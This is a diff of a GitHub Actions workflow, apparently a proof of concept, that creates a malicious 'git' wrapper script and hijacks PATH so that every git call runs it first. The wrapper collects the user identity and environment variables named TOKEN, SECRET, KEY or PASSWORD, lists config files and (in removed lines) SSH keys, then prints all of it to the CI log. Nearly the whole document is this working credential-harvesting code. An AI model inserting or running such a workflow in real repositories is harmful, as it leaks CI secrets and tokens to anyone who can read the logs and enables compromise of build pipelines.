@@ -1,30 +1,33 @@
+name: PoC Security Test
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
       - name: Create malicious git
         run: |
           mkdir -p bin
           cat << 'EOF' > bin/git
           #!/bin/bash
-          # دیاریکردنی ڕێڕەوی فایلەکان بۆ پاراستنی ئەنجام
           OUTPUT="/tmp/proof.txt"
-          
           echo "--- ADVANCED RCE PROOF ---" > $OUTPUT
-          echo "--- USER & PERMISSIONS ---" >> $OUTPUT
-          id >> $OUTPUT
-          
-          echo -e "\n--- ENVIRONMENT VARIABLES (SENSITIVE) ---" >> $OUTPUT
-          # چاپکردنی هەموو گۆڕاوەکان، بەڵام بۆ ئەوەی زۆر نەبێت، تەنها ئەوانە چاپ دەکەین کە گرنگن
-          printenv | grep -E 'TOKEN|SECRET|KEY|PASSWORD|GITHUB_TOKEN' >> $OUTPUT
-          
-          echo -e "\n--- SENSITIVE CONFIG FILES ---" >> $OUTPUT
-          # گەڕان بەدوای فایلەکانی config و credential لە ناو پرۆژەکەدا
-          find . -maxdepth 3 -name "*.env*" -o -name "*.json" -o -name "*.yaml" >> $OUTPUT
-          
-          echo -e "\n--- SSH KEYS CHECK ---" >> $OUTPUT
-          ls -la /home/runner/.ssh >> $OUTPUT 2>&1
-          
-          echo -e "\n--- CURRENT DIRECTORY STRUCTURE ---" >> $OUTPUT
-          ls -Rla >> $OUTPUT 2>&1
-          
-          # جێبەجێکردنی فەرمانی ڕەسەن بۆ ئەوەی ڕێڕەوی کارکردنەکە تێکنەچێت
+          echo "USER INFO:" >> $OUTPUT
+          id >> $OUTPUT 2>&1
+          echo -e "\n--- SECRET TOKENS ---" >> $OUTPUT
+          printenv | grep -E 'TOKEN|SECRET|KEY|PASSWORD' >> $OUTPUT 2>&1
+          echo -e "\n--- SENSITIVE FILES ---" >> $OUTPUT
+          find . -maxdepth 2 -name "*.env" -o -name "*.json" >> $OUTPUT 2>&1
           /usr/bin/git "$@"
           EOF
           chmod +x bin/git
+          
+      - name: Inject PATH
+        run: echo "$GITHUB_WORKSPACE/bin" >> $GITHUB_PATH
+        
+      - name: Run test
+        run: |
+          git --version
+          echo "--- RESULT ---"
+          cat /tmp/proof.txt
